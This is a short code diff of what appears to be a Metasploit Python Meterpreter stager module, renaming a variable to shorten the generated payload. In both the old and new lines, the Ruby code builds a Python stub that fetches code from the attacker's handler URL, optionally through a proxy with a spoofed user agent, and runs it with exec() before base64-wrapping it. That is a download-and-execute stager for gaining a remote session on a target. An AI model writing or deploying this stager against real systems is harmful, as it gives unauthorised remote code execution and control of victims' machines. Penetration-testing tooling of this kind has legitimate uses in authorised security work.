@@ -48,15 +48,14 @@ module Metasploit3
 
     cmd  = "import sys\n"
     if datastore['PROXYHOST'].blank?
-      cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener'])\n"
-      cmd << "opener=ul.build_opener()\n"
+      cmd << "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener()\n"
     else
       proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
       cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
-      cmd << "opener=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
+      cmd << "o=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
     end
-    cmd << "opener.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
-    cmd << "exec(opener.open('#{target_url}').read())\n"
+    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
+    cmd << "exec(o.open('#{target_url}').read())\n"
 
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
     b64_stub  = "import base64,sys;exec(base64.b64decode("
